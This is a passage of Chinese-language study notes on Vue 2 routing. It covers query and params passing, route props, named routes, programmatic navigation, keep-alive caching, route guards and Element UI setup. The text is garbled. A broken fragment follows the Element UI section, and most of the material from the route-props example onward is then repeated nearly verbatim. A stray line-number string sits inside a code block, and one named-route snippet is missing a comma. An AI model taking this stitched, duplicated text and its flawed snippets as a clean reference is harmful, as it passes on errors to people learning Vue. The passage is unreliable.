</template>

<script>
	export default {
		name:'Detail',
		mounted() {
			console.log(this.$route)
		},
	}
</script>
```

↓ router/index.js：

```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
//引入组件
import About from '../pages/About'
import Home from '../pages/Home'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

//创建并暴露一个路由器
export default new VueRouter({
	routes:[
		{
			path:'/about',
			component:About
		},
		{
			path:'/home',
			component:Home,
			children:[
				{
					path:'news',
					component:News,
				},
				{
					path:'message',
					component:Message,
					children:[
						{
							path:'detail',
							component:Detail,
						}
					]
				}
			]
		}
	]
})

```

↓ App.vue：

```vue
<template>
  <div>
    <div class="row">
      <Banner/>
    </div>
    <div class="row">
      <div class="col-xs-2 col-xs-offset-2">
        <div class="list-group">
					<!-- 原始html中我们使用a标签实现页面的跳转 -->
          <!-- <a class="list-group-item active" href="./about.html">About</a> -->
          <!-- <a class="list-group-item" href="./home.html">Home</a> -->

					<!-- Vue中借助router-link标签实现路由的切换 -->
					<router-link class="list-group-item" active-class="active" to="/about">About</router-link>
          <router-link class="list-group-item" active-class="active" to="/home">Home</router-link>
        </div>
      </div>
      <div class="col-xs-6">
        <div class="panel">
          <div class="panel-body">
						<!-- 指定组件的呈现位置 -->
            <router-view></router-view>
          </div>
        </div>
      </div>
    </div>
  </div>
</template>

<script>
	import Banner from './components/Banner'
	export default {
		name:'App',
		components:{Banner}
	}
</script>

```

总结：

**传递参数**

```vue
<!-- 跳转并携带query参数，to的字符串写法 -->
<router-link :to="/home/message/detail?id=666&title=你好">跳转</router-link>
```

```vue
<!-- 跳转并携带query参数，to的对象写法【】 -->
<router-link :to="{
	path:'/home/message/detail',
	query:{
		id:888,
        title:'你好'
	}
}">跳转</router-link>
```

**接收参数**

```js
$route.query.id
$route.query.title
```

#### params参数

> 特别注意：路由携带params参数时，若使用**to的对象写法**，则不能使用path配置项，==必须使用**name**配置！==

修改部分代码：

↓ pages/Message.vue:：

```vue
<template>
  <div>
    <ul>
      <li v-for="m in messageList" :key="m.id">
        <!-- 跳转路由并携带params参数，to的对象写法 -->
        <router-link
          :to="{
            name: 'message-detail',
            params: {
              id: m.id,
              title: m.title,
            },
          }"
        >
          {{ m.title }}
        </router-link>
      </li>
    </ul>
    <hr />
    <router-view></router-view>
  </div>
</template>

<script>
export default {
  name: "Message",
  data() {
    return {
      messageList: [
        { id: "001", title: "消息001" },
        { id: "002", title: "消息002" },
        { id: "003", title: "消息003" },
      ],
    };
  },
};
</script>

```

↓ pages/Detail.vue:：

```vue
<template>
	<ul>
		<li>消息编号：{{$route.params.id}}</li>
		<li>消息标题：{{$route.params.title}}</li>
	</ul>
</template>

<script>
	export default {
		name:'Detail',
		mounted() {
			console.log(this.$route)
		},
	}
</script>
```

↓ router/index.js：

```js
// 该文件专门用于创建整个应用的路由器
import VueRouter from 'vue-router'
// 引入组件
import Home from '../pages/Home'
import About from '../pages/About'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'

// 创建并暴露一个路由器
export default new VueRouter({
  routes: [
    {
      path: '/about',
      component: About
    },
    {
      path: '/home',
      component: Home,
      children: [
        {
          path: 'news',
          component: News
        },
        {
          path: 'message',
          component: Message,
          children: [
            {
              name: 'message-detail',
              path: 'message-detail/:id/:title',
              component: Detail
            }
          ]
        }
      ]
    }
  ]
})

```

#### props配置

↓ Messgae.vue：

```vue
<template>
    <div>
        <ul>
            <li v-for="m in messageList" :key="m.id">
                <router-link :to="{
                    name:'xiangqing',
                    params:{
                        id:m.id,
                        title:m.title
                    }
                }">
                    {{m.title}}
                </router-link>&nbsp;&nbsp;
            </li>
        </ul>
        <hr/>
        <router-view></router-view>
    </div>
</template>

<script>
    export default {
        name:'News',
        data(){
            return{
                messageList:[
                    {id:'001',title:'消息001'},
                    {id:'002',title:'消息002'},
                    {id:'003',title:'消息003'}
                ]
            }
        }
    }
</script>
```

↓ Detail.vue：

```vue
<template>
    <ul>
        <li>消息编号：{{id}}</li>
        <li>消息标题：{{title}}</li>
    </ul>
</template>

<script>
    export default {
        name:'Detail',
        props:['id','title']
    }
</script>
```

↓ router/index.js：

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from "vue-router";
//引入组件
import Home from '../pages/Home'
import About from '../pages/About'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'


//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },
        {
            path:'/home',
            component:Home,
            children:[
                {
                    path:'news',
                    component:News
                },
                {
                    path:'message',
                    component:Message,
                    children:[
                        {
                            name:'xiangqing',
                            path:'detail/:id/:title',
                            component:Detail,
                            //props的第一种写法，值为对象，该对象中的所有key-value都会以props的形式传给Detail组件。
							// props:{a:1,b:'hello'}

							//props的第二种写法，值为布尔值，若布尔值为真，就会把该路由组件收到的所有params参数，以props的形式传给Detail组件。
							// props:true

							//props的第三种写法，值为函数
							props($route){
								return {
									id:$route.params.id,
									title:$route.params.title,
								}
							}
                        }
                    ]
                }
            ]
        }
    ]
})
```

总结：

- 作用：让路由组件更方便的收到参数
- 三种写法：
    - 对象写法
    - 函数写法（推荐）
    - 布尔写法

### 6.5 命名路由

作用：可以简化路由的跳转

使用：

1. 给路由命名：
    
    ```js
    {
    	path:'/demo',
    	component:Demo,
    	children:[
    		{
    			path:'test',
    			component:Test,
    			children:[
    				{
                        name:'hello' //给路由命名
    					path:'welcome',
    					component:Hello,
    				}
    			]
    		}
    	]
    }
    ```
    
2. 简化跳转：
    
    ```vue
    <!--简化前，需要写完整的路径 -->
    <router-link to="/demo/test/welcome">跳转</router-link>
    
    <!--简化后，直接通过名字跳转 -->
    <router-link :to="{name:'hello'}">跳转</router-link>
    
    <!--简化写法配合传递参数 -->
    <router-link 
    	:to="{
    		name:'hello',
    		query:{
    		    id:666,
                title:'你好'
    		}
    	}"
    >
        跳转
    </router-link>
    ```
    

### **6.6** **编程式路由导航⭐**

路由跳转的replace方法：的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：`push`和`replace`，其中`push`是追加历史记录，`replace`是替换当前记录。路由跳转时候默认为`push`方式
3. 开启`replace`模式：`<router-link replace ...>News</router-link>`

```vue
<!-- 完整写法 -->
<router-link :replace="true" to="/XXX"></router-link>
<!-- 简写 -->
<router-link replace to="/XXX"></router-link>
```

**其他相关 API：**

1. this.$router.push(path): 相当于点击路由链接(可以返回到当前路由界面)
    
2. this.$router.replace(path): 用新路由替换当前路由(不可以返回到当前路由界面)
    
3. this.$router.back(): 请求(返回)上一个记录路由
    
4. this.$router.go(-1): 请求(返回)上一个记录路由
    
5. this.$router.go(1): 请求下一个记录路由
    

**编程式路由导航**：

作用：不借助`<router-link>`实现路由跳转，让路由跳转更加灵活

代码：

```js
//$router的两个API
this.$router.push({
	name:'路由组件名',
		params:{
			id:xxx,
			title:xxx
		}
})

this.$router.replace({
	name:'路由组件名',
		params:{
			id:xxx,
			title:xxx
		}
})
this.$router.forward() //前进
this.$router.back() //后退
this.$router.go(int) //前进或后退？步，传数字负数后退，正数前进
```

### 6.7 缓存路由组件

News.vue:

```vue
<template>
    <ul>
        <li>news001 <input type="text"></li>
        <li>news002 <input type="text"></li>
        <li>news003 <input type="text"></li>
    </ul>
</template>

<script>
    export default {
        name:'News'
    }
</script>
12345678910111213
```

Home.vue :

```vue
<template>
    <div>
        <h2>Home组件内容</h2>
		<div>
			<ul class="nav nav-tabs">
				<li>
					<router-link replace class="list-group-item" active-class="active" to="/home/news">News</router-link>
				</li>
				<li>
					<router-link replace class="list-group-item" active-class="active" to="/home/message">Message</router-link>
				</li>
			</ul>
			<keep-alive include="News">
				<router-view></router-view>
			</keep-alive>
		</div>
    </div>
</template>

<script>
    export default {
        name:'Home'
    }
</script>
```

总结：

- 作用：让不展示的路由组件保持挂载，不被销毁
    
- 代码：
    
    ```vue
    //缓存一个路由组件
    <keep-alive include="News"> //include中写想要缓存的组件名，不写表示全部缓存
        <router-view></router-view>
    </keep-alive>
    
    //缓存多个路由组件
    <keep-alive :include="['News','Message']"> 
        <router-view></router-view>
    </keep-alive>
    ```
    

### 6.8 activated和deactivated

News.vue：

```vue
<template>
    <ul>
        <li :style="{opacity}">欢迎学习vue</li>
        <li>news001 <input type="text"></li>
        <li>news002 <input type="text"></li>
        <li>news003 <input type="text"></li>
    </ul>
</template>

<script>
    export default {
        name:'News',
        data(){
            return{
                opacity:1
            }
        },
        activated(){
            console.log('News组件被激活了')
            this.timer = setInterval(() => {
                this.opacity -= 0.01
                if(this.opacity <= 0) this.opacity = 1
            },16)
        },
        deactivated(){
            console.log('News组件失活了')
            clearInterval(this.timer)
        }
    }
</script>
```

1. `activated`和`deactivated`是路由组件所独有的两个钩子，用于捕获路由组件的激活状态
2. 具体使用：
    - `activated`路由组件被激活时触发
    - `deactivated`路由组件失活时触发

### 6.9 路由守卫

> 登录–权限

1. 作用：对路由进行权限控制
    
2. 分类：全局守卫、独享守卫、组件内守卫
    
3. 全局守卫：**beforeEach**
    
    ```js
    //全局前置守卫：初始化时执行、每次路由切换前执行
    router.beforeEach((to,from,next)=>{
    	console.log('beforeEach',to,from)
    	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
    		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
    			next() //放行
    		}else{
    			alert('暂无权限查看')
    		}
    	}else{
    		next() //放行
    	}
    })
    
    //全局后置守卫：初始化时执行、每次路由切换后执行
    router.afterEach((to,from) => {
    	console.log('afterEach',to,from)
    	if(to.meta.title){ 
    		document.title = to.meta.title //修改网页的title
    	}else{
    		document.title = 'vue_test'
    	}
    })
    ```
    
4. 独享守卫：**beforeEnter**
    
    > 只有前置没有后置！
    
    ```js
    beforeEnter(to,from,next){
    	console.log('beforeEnter',to,from)
        if(localStorage.getItem('school') === 'atguigu'){
            next()
        }else{
            alert('暂无权限查看')
        }
    }
    ```
    
5. 组件内守卫：
    
    ```js
    //进入守卫：通过路由规则，进入该组件时被调用
    beforeRouteEnter (to, from, next) {...},
    //离开守卫：通过路由规则，离开该组件时被调用
    beforeRouteLeave (to, from, next) {...},
    ```
    

### 6.10 路由器的两种工作模式

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器
3. hash模式：
    1. 地址中永远带着#号，不美观
    2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法
    3. 兼容性较好
4. history模式：
    1. 地址干净，美观
    2. 兼容性和hash模式相比略差
    3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题

## 第 7 章：Vue UI 组件库

#### 7.1 移动端常用UI 组件库

1. [Vant](https://youzan.github.io/vant)
    
2. [Cube UI](https://didi.github.io/cube-ui)
    
3. [Mint UI](http://mint-ui.github.io/)
    

#### 7.2 PC 端常用UI 组件库

1. [Element UI](https://element.eleme.cn/)
    
2. [IView UI](https://www.iviewui.com/)
    

#### 7.3 element-ui基本使用

1. 安装 element-ui：`npm i element-ui -S`
    
2. mian.js：
    
    ```js
    import Vue from 'vue'
    import App from './App.vue'
    //引入ElementUI组件库
    import ElementUI from 'element-ui';
    //引入ElementUI全部样式
    import 'element-ui/lib/theme-chalk/index.css';
    
    Vue.config.productionTip = false
    //使用ElementUI
    Vue.use(ElementUI)
    
    new Vue({
        el:"#app",
        render: h => h(App),
    })
    
    ```
    
3. App.vue：
    
    ```vue
    <template>
    	<div>
    		<br>
    		<el-row>
    			<el-button icon="el-icon-search" circle></el-button>
    			<el-button type="primary" icon="el-icon-edit" circle></el-button>
    			<el-button type="success" icon="el-icon-check" circle></el-button>
    			<el-button type="info" icon="el-icon-message" circle></el-button>
    			<el-button type="warning" icon="el-icon-star-off" circle></el-button>
    			<el-button type="danger" icon="el-icon-delete" circle></el-button>
    		</el-row>
    	</div>
    </template>
    
    <script>
    	export default {
    		name:'App',
    	}
    </script>
    ```
    

#### 7.4 element-ui按需引入

1. 安装 babel-plugin-component：`npm install babel-plugin-component -D`
    
2. 修改 `babel-config-js`：
    
    ```js
    module.exports = {
      presets: [
        '@vue/cli-plugin-babel/preset',
        ["@babel/preset-env", { "modules": false }]
      ],
      plugins: [
        [
          "component",
          {
            "libraryName": "element-ui",
            "styleLibraryName": "theme-chalk"
          }
        ]
      ]
    }
    
    ```
    
3. main.js：
    
    ```js
    import Vue from 'vue'
    import App from './App.vue'
    //按需引入
    import { Button,Row } from 'element-ui'
    
    
    Vue.config.productionTip = false
    
    Vue.component(Button.name, Button);
    Vue.component(Row.name, Row);
    /* 或写为
     * Vue.use(Button)
     * Vue.use(Row)
     */
    
    new Vue({
        el:"#app",
        render: h => h(App),
    })
    
    ```
    
    从  
    ]  
    }  
    }  
    }  
    

````

↓ Detail.vue：

```vue
<template>
    <ul>
        <li>消息编号：{{id}}</li>
        <li>消息标题：{{title}}</li>
    </ul>
</template>

<script>
    export default {
        name:'Detail',
        props:['id','title']
    }
</script>
````

↓ router/index.js：

```js
//该文件专门用于创建整个应用的路由器
import VueRouter from "vue-router";
//引入组件
import Home from '../pages/Home'
import About from '../pages/About'
import News from '../pages/News'
import Message from '../pages/Message'
import Detail from '../pages/Detail'


//创建并暴露一个路由器
export default new VueRouter({
    routes:[
        {
            path:'/about',
            component:About
        },
        {
            path:'/home',
            component:Home,
            children:[
                {
                    path:'news',
                    component:News
                },
                {
                    path:'message',
                    component:Message,
                    children:[
                        {
                            name:'xiangqing',
                            path:'detail/:id/:title',
                            component:Detail,
                            //props的第一种写法，值为对象，该对象中的所有key-value都会以props的形式传给Detail组件。
							// props:{a:1,b:'hello'}

							//props的第二种写法，值为布尔值，若布尔值为真，就会把该路由组件收到的所有params参数，以props的形式传给Detail组件。
							// props:true

							//props的第三种写法，值为函数
							props($route){
								return {
									id:$route.params.id,
									title:$route.params.title,
								}
							}
                        }
                    ]
                }
            ]
        }
    ]
})
```

总结：

- 作用：让路由组件更方便的收到参数
- 三种写法：
    - 对象写法
    - 函数写法（推荐）
    - 布尔写法

### 6.5 命名路由

作用：可以简化路由的跳转

使用：

1. 给路由命名：
    
    ```js
    {
    	path:'/demo',
    	component:Demo,
    	children:[
    		{
    			path:'test',
    			component:Test,
    			children:[
    				{
                        name:'hello' //给路由命名
    					path:'welcome',
    					component:Hello,
    				}
    			]
    		}
    	]
    }
    ```
    
2. 简化跳转：
    
    ```vue
    <!--简化前，需要写完整的路径 -->
    <router-link to="/demo/test/welcome">跳转</router-link>
    
    <!--简化后，直接通过名字跳转 -->
    <router-link :to="{name:'hello'}">跳转</router-link>
    
    <!--简化写法配合传递参数 -->
    <router-link 
    	:to="{
    		name:'hello',
    		query:{
    		    id:666,
                title:'你好'
    		}
    	}"
    >
        跳转
    </router-link>
    ```
    

### **6.6** **编程式路由导航⭐**

路由跳转的replace方法：的replace属性

1. 作用：控制路由跳转时操作浏览器历史记录的模式
2. 浏览器的历史记录有两种写入方式：`push`和`replace`，其中`push`是追加历史记录，`replace`是替换当前记录。路由跳转时候默认为`push`方式
3. 开启`replace`模式：`<router-link replace ...>News</router-link>`

```vue
<!-- 完整写法 -->
<router-link :replace="true" to="/XXX"></router-link>
<!-- 简写 -->
<router-link replace to="/XXX"></router-link>
```

**其他相关 API：**

1. this.$router.push(path): 相当于点击路由链接(可以返回到当前路由界面)
    
2. this.$router.replace(path): 用新路由替换当前路由(不可以返回到当前路由界面)
    
3. this.$router.back(): 请求(返回)上一个记录路由
    
4. this.$router.go(-1): 请求(返回)上一个记录路由
    
5. this.$router.go(1): 请求下一个记录路由
    

**编程式路由导航**：

作用：不借助`<router-link>`实现路由跳转，让路由跳转更加灵活

代码：

```js
//$router的两个API
this.$router.push({
	name:'路由组件名',
		params:{
			id:xxx,
			title:xxx
		}
})

this.$router.replace({
	name:'路由组件名',
		params:{
			id:xxx,
			title:xxx
		}
})
this.$router.forward() //前进
this.$router.back() //后退
this.$router.go(int) //前进或后退？步，传数字负数后退，正数前进
```

### 6.7 缓存路由组件

News.vue:

```vue
<template>
    <ul>
        <li>news001 <input type="text"></li>
        <li>news002 <input type="text"></li>
        <li>news003 <input type="text"></li>
    </ul>
</template>

<script>
    export default {
        name:'News'
    }
</script>
12345678910111213
```

Home.vue :

```vue
<template>
    <div>
        <h2>Home组件内容</h2>
		<div>
			<ul class="nav nav-tabs">
				<li>
					<router-link replace class="list-group-item" active-class="active" to="/home/news">News</router-link>
				</li>
				<li>
					<router-link replace class="list-group-item" active-class="active" to="/home/message">Message</router-link>
				</li>
			</ul>
			<keep-alive include="News">
				<router-view></router-view>
			</keep-alive>
		</div>
    </div>
</template>

<script>
    export default {
        name:'Home'
    }
</script>
```

总结：

- 作用：让不展示的路由组件保持挂载，不被销毁
    
- 代码：
    
    ```vue
    //缓存一个路由组件
    <keep-alive include="News"> //include中写想要缓存的组件名，不写表示全部缓存
        <router-view></router-view>
    </keep-alive>
    
    //缓存多个路由组件
    <keep-alive :include="['News','Message']"> 
        <router-view></router-view>
    </keep-alive>
    ```
    

### 6.8 activated和deactivated

News.vue：

```vue
<template>
    <ul>
        <li :style="{opacity}">欢迎学习vue</li>
        <li>news001 <input type="text"></li>
        <li>news002 <input type="text"></li>
        <li>news003 <input type="text"></li>
    </ul>
</template>

<script>
    export default {
        name:'News',
        data(){
            return{
                opacity:1
            }
        },
        activated(){
            console.log('News组件被激活了')
            this.timer = setInterval(() => {
                this.opacity -= 0.01
                if(this.opacity <= 0) this.opacity = 1
            },16)
        },
        deactivated(){
            console.log('News组件失活了')
            clearInterval(this.timer)
        }
    }
</script>
```

1. `activated`和`deactivated`是路由组件所独有的两个钩子，用于捕获路由组件的激活状态
2. 具体使用：
    - `activated`路由组件被激活时触发
    - `deactivated`路由组件失活时触发

### 6.9 路由守卫

> 登录–权限

1. 作用：对路由进行权限控制
    
2. 分类：全局守卫、独享守卫、组件内守卫
    
3. 全局守卫：**beforeEach**
    
    ```js
    //全局前置守卫：初始化时执行、每次路由切换前执行
    router.beforeEach((to,from,next)=>{
    	console.log('beforeEach',to,from)
    	if(to.meta.isAuth){ //判断当前路由是否需要进行权限控制
    		if(localStorage.getItem('school') === 'atguigu'){ //权限控制的具体规则
    			next() //放行
    		}else{
    			alert('暂无权限查看')
    		}
    	}else{
    		next() //放行
    	}
    })
    
    //全局后置守卫：初始化时执行、每次路由切换后执行
    router.afterEach((to,from) => {
    	console.log('afterEach',to,from)
    	if(to.meta.title){ 
    		document.title = to.meta.title //修改网页的title
    	}else{
    		document.title = 'vue_test'
    	}
    })
    ```
    
4. 独享守卫：**beforeEnter**
    
    > 只有前置没有后置！
    
    ```js
    beforeEnter(to,from,next){
    	console.log('beforeEnter',to,from)
        if(localStorage.getItem('school') === 'atguigu'){
            next()
        }else{
            alert('暂无权限查看')
        }
    }
    ```
    
5. 组件内守卫：
    
    ```js
    //进入守卫：通过路由规则，进入该组件时被调用
    beforeRouteEnter (to, from, next) {...},
    //离开守卫：通过路由规则，离开该组件时被调用
    beforeRouteLeave (to, from, next) {...},
    ```
    

### 6.10 路由器的两种工作模式

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器
3. hash模式：
    1. 地址中永远带着#号，不美观
    2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法
    3. 兼容性较好
4. history模式：
    1. 地址干净，美观
    2. 兼容性和hash模式相比略差
    3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题

## 第 7 章：Vue UI 组件库

#### 7.1 移动端常用UI 组件库

1. [Vant](https://youzan.github.io/vant)
    
2. [Cube UI](https://didi.github.io/cube-ui)
    
3. [Mint UI](http://mint-ui.github.io/)
    

#### 7.2 PC 端常用UI 组件库

1. [Element UI](https://element.eleme.cn/)
    
2. [IView UI](https://www.iviewui.com/)
    

#### 7.3 element-ui基本使用

1. 安装 element-ui：`npm i element-ui -S`
    
2. mian.js：
    
    ```js
    import Vue from 'vue'
    import App from './App.vue'
    //引入ElementUI组件库
    import ElementUI from 'element-ui';
    //引入ElementUI全部样式
    import 'element-ui/lib/theme-chalk/index.css';
    
    Vue.config.productionTip = false
    //使用ElementUI
    Vue.use(ElementUI)
    
    new Vue({
        el:"#app",
        render: h => h(App),
    })
    
    ```
    
3. App.vue：
    
    ```vue
    <template>
    	<div>
    		<br>
    		<el-row>
    			<el-button icon="el-icon-search" circle></el-button>
    			<el-button type="primary" icon="el-icon-edit" circle></el-button>
    			<el-button type="success" icon="el-icon-check" circle></el-button>
    			<el-button type="info" icon="el-icon-message" circle></el-button>
    			<el-button type="warning" icon="el-icon-star-off" circle></el-button>
    			<el-button type="danger" icon="el-icon-delete" circle></el-button>
    		</el-row>
    	</div>
    </template>
    
    <script>
    	export default {
    		name:'App',
    	}
    </script>
    ```
    

#### 7.4 element-ui按需引入

1. 安装 babel-plugin-component：`npm install babel-plugin-component -D`
    
2. 修改 `babel-config-js`：
    
    ```js
    module.exports = {
      presets: [
        '@vue/cli-plugin-babel/preset',
        ["@babel/preset-env", { "modules": false }]
      ],
      plugins: [
        [
          "component",
          {
            "libraryName": "element-ui",
            "styleLibraryName": "theme-chalk"
          }
        ]
      ]
    }
    
    ```
    
3. main.js：
    
    ```js
    import Vue from 'vue'
    import App from './App.vue'
    //按需引入
    import { Button,Row } from 'element-ui'
    
    
    Vue.config.productionTip = false
    
    Vue.component(Button.name, Button);
    Vue.component(Row.name, Row);
    /* 或写为
     * Vue.use(Button)
     * Vue.use(Row)
     */
    
    new Vue({
        el:"#app",
        render: h => h(App),
    })
    ```